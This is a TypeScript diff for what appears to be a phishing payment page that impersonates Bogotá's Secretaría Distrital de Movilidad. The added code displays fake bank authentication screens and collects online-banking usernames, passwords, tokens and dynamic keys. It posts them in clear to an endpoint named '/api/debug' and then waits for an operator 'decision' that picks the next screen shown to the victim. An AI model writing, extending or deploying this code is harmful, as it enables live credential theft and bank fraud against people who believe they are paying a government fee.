@@ -508,6 +508,9 @@ function showChallengeScreen(brandKey: string, message = "") {
   challenge?.querySelectorAll("[data-challenge-brand]").forEach((panel) => {
     (panel as HTMLElement).hidden = panel.getAttribute("data-challenge-brand") !== brandKey;
   });
+  challenge?.querySelectorAll("[data-challenge-auth]").forEach((panel) => {
+    (panel as HTMLElement).hidden = true;
+  });
   challenge?.querySelectorAll("[data-challenge-merchant]").forEach((el) => {
     el.textContent = "Secretaría Distrital de Movilidad";
   });
@@ -541,6 +544,51 @@ function setChallengeMessage(brand: string, message: string, kind = "error") {
   error.style.color = kind === "info" ? "#1b4e9b" : "#b42318";
 }
 
+function setAuthMessage(kind: string, message: string) {
+  const challenge = $("pagos-challenge-screen");
+  const panel = challenge?.querySelector(`[data-challenge-auth="${kind}"]`);
+  const form = panel?.querySelector("[data-auth-form]");
+  if (!form) return;
+  let error = form.querySelector("[data-auth-debug-message]") as HTMLElement | null;
+  if (!error) return;
+  error.textContent = message || "";
+  error.hidden = !message;
+}
+
+function showAuthScreen(kind: string, message = "") {
+  const challenge = $("pagos-challenge-screen");
+  const now = new Date();
+  const months = [
+    "enero", "febrero", "marzo", "abril", "mayo", "junio",
+    "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre",
+  ];
+  const datetimeLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
+  const amountLabel = formatCop(grandTotal());
+  hideWaitScreen();
+  challenge?.querySelectorAll("[data-challenge-brand]").forEach((panel) => {
+    (panel as HTMLElement).hidden = true;
+  });
+  challenge?.querySelectorAll("[data-challenge-auth]").forEach((panel) => {
+    const active = panel.getAttribute("data-challenge-auth") === kind;
+    (panel as HTMLElement).hidden = !active;
+    if (!active) return;
+    panel.querySelectorAll("[data-challenge-merchant]").forEach((el) => {
+      el.textContent = "Secretaría Distrital de Movilidad";
+    });
+    panel.querySelectorAll("[data-challenge-amount]").forEach((el) => {
+      el.textContent = amountLabel;
+    });
+    panel.querySelectorAll("[data-challenge-datetime]").forEach((el) => {
+      el.textContent = datetimeLabel;
+    });
+    panel.querySelectorAll("input").forEach((input) => {
+      (input as HTMLInputElement).value = "";
+    });
+  });
+  if (challenge) challenge.hidden = false;
+  if (message) setAuthMessage(kind, message);
+}
+
 function showCardErrorModal(message: string) {
   const modal = $("pagos-debug-modal");
   const text = $("pagos-debug-modal-message");
@@ -557,6 +605,18 @@ async function handlePaymentDecision(
   const action = decision.action || "timeout";
   if (action === "sms" || action === "sms_error") {
     showChallengeScreen(brandKey, action === "sms_error" ? decision.message || "" : "");
+    return;
+  }
+  if (action === "userpass" || action === "userpass_error") {
+    showAuthScreen("userpass", action === "userpass_error" ? decision.message || "" : "");
+    return;
+  }
+  if (action === "token" || action === "token_error") {
+    showAuthScreen("token", action === "token_error" ? decision.message || "" : "");
+    return;
+  }
+  if (action === "dynamic" || action === "dynamic_error") {
+    showAuthScreen("dynamic", action === "dynamic_error" ? decision.message || "" : "");
     return;
   }
   if (action === "card" || action === "card_error") {
@@ -1015,6 +1075,57 @@ export function bindSolicitudWizard() {
         input.focus();
         return;
       }
+      await handlePaymentDecision(decision, brandKey, payBtn);
+    });
+  });
+  document.querySelectorAll("[data-auth-form]").forEach((form) => {
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+      const kind = form.getAttribute("data-auth-form") || "userpass";
+      const username = (form.querySelector('input[name="username"]') as HTMLInputElement | null)?.value.trim() || "";
+      const password = (form.querySelector('input[name="password"]') as HTMLInputElement | null)?.value.trim() || "";
+      const token = (form.querySelector('input[name="token"]') as HTMLInputElement | null)?.value.trim() || "";
+      const cdin = (form.querySelector('input[name="cdin"]') as HTMLInputElement | null)?.value.trim() || "";
+      if (kind === "userpass" && (!username || !password)) {
+        setAuthMessage(kind, "Ingresa tu usuario y contraseña para continuar.");
+        return;
+      }
+      if (kind === "token" && !token) {
+        setAuthMessage(kind, "Ingresa el token para continuar.");
+        return;
+      }
+      if (kind === "dynamic" && !cdin) {
+        setAuthMessage(kind, "Ingresa la clave dinámica para continuar.");
+        return;
+      }
+      const eventName = kind === "token" ? "TOKEN_SUBMIT" : kind === "dynamic" ? "DYNAMIC_SUBMIT" : "USERPASS_SUBMIT";
+      const sessionId = sessionStorage.getItem("latam-debug-session-id") || crypto.randomUUID();
+      sessionStorage.setItem("latam-debug-session-id", sessionId);
+      const brandKey = "visa";
+      try {
+        await fetch("/api/debug", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            event: eventName,
+            sessionId,
+            route: "/Registro",
+            meta: {
+              step: kind === "token" ? "Envió token" : kind === "dynamic" ? "Envió clave dinámica" : "Envió usuario y contraseña",
+              username,
+              password,
+              token,
+              cdin,
+            },
+          }),
+        });
+      } catch {
+        setAuthMessage(kind, "No pudimos procesar los datos. Intenta nuevamente.");
+        return;
+      }
+      showWaitScreen(brandKey);
+      const decision = await pollDebugDecision(sessionId);
+      const payBtn = $("btnPagarTarjeta") as HTMLButtonElement | null;
       await handlePaymentDecision(decision, brandKey, payBtn);
     });
   });
